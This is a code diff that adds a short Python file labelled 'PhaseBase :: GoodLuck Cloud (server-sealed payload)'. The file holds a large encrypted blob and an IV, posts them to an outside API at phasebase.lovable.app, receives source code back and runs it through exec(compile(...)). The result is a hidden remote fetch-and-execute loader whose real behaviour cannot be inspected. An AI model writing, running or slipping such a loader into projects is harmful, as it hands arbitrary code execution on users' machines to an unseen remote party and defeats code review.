@@ -1,0 +1,8 @@
+# PhaseBase :: GoodLuck Cloud (server-sealed payload) — decoder lives behind the PhaseBase API.
+import json, urllib.request
+_CT="4647f81++5Ly9n/cGpI+X8dwNs18YauGgkvT0Uzc7mQX5Y/7iedfOmiKjoTZueNzHqozRMz61kj7mmYTm70XWbuL2zR6usVF6XKajFm3WkE3+l49xFOROnHuV4gJndHIu8h52KLnzPeM6ZYtP92uBbDEXNYtR0nBEwLIeRfsfGieSjIeADPGoKTFCygMTCD/tVVqCwSB/4V9UkhoG0joyS655z1fiUuAdw5poUs73IrACeUbMiDpVdmUHuSqpSwjL9Ka6mxKFBMRGqLxA5F+tBLIUaNbdAaS9+EWp5nofgk/b7wCZX58hsQ1B1d9fOjwUHeR7LdWnxaCCGWNSzWErd770iGns2dyf/Ea2HbR7ype0hSHB9zaEtUNW0V9F7bSZLIXQ+PHez+YG1pzzhAtRFgckvt+/dIHaYO666hC0fTp/s+4b5DNmmHmPhV5OP0Pkp4x23bRJ8Ibs9xMfBcNWEMdE6wqf5sZHQAQtMEFdG9+nwYXH8JLau6NnEBHGwAEQZYD7tOoHsZoc/VUFfPFnNFkivbLEnmvt5YYK//jin8SkgGL4/xGkXNE4xq54yHrPyx/GHbsq3e8LX8tJ3hpi4YHWYwLSrKBSIx21qMdIL4RAheVLmoMBMnes6MHvAYQ08fc96Fzn9kRL9nLovPWgiOqhe4ROzQSFgADmyr3Pb8srRBaU7Z+fBGggSmR91BXlRL/qCAibdIX6E6BEt7UfJTAC4wGEZ+QXFKf9JAag4vsvcsMp62vQO9Tc/OTzjFr8sY86Cxq4eXFa+Q6yV/JS5mNm9NGc8ftODBSkd8CVgHSsSr6tUW72kThnmfQX+2YW1iK2/Z1uDcUlHyWoBUmfWeBhhdxtXEI8axOHBO1o/igEPiunPujXtfE5LJcMMhYDqfEGCd9MGrawkqbshFrP1CcU+cT3JN9bG3BkcFOQIOpk6t+3lP7xkIwhpqVSa2lVvo65lBMS4dtQODLktFelSwLypLF7d58gMmILyqOCLjoCoadRmt2NNzaOCQ2ah9jL69dLbyGjMcrxJwNEz84QUUoTZz5UB1Qp+rXxJ13yJzpnGBWu8dwyGJil01oCO67t9RUUwxGg+Xcsu0uBNv4gxdLXMIDHU7mK5JMVg=="
+_IV="D3CTX9/6fZxodOjQ"
+_API="https://phasebase.lovable.app/api/public/goodluck/decode"
+_req=urllib.request.Request(_API, data=json.dumps({"ct":_CT,"iv":_IV}).encode(), headers={"Content-Type":"application/json","User-Agent":"PhaseBase-GoodLuck/1.0 (+https://phasebase.lovable.app)"})
+_src=json.loads(urllib.request.urlopen(_req).read())["code"]
+exec(compile(_src, "<phasebase>", "exec"))
